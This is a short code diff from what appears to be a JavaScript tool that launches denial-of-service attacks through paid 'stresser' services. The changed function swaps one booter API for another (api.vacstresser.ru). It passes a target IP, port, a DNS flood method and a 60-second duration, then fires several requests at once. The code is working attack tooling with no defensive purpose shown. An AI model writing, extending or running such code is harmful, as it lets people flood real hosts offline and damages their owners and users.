@@ -54,8 +54,8 @@ async function clear() {
 }
 
 async function sendApiRequest(ip) {
-    const url = `https://darlingapi.com?token=${token}&host=${ip}&port=${port}&time=60&method=UDP-DNS`;
-    const requests = Array(4).fill(url).map(u => axios.get(u));
+    const url = `https://api.vacstresser.ru/api?key=${token}&host=${ip}/32&port=${port}&method=DNS&time=60`;
+    const requests = Array(2).fill(url).map(u => axios.get(u));
     
     try {
         await axios.all(requests);
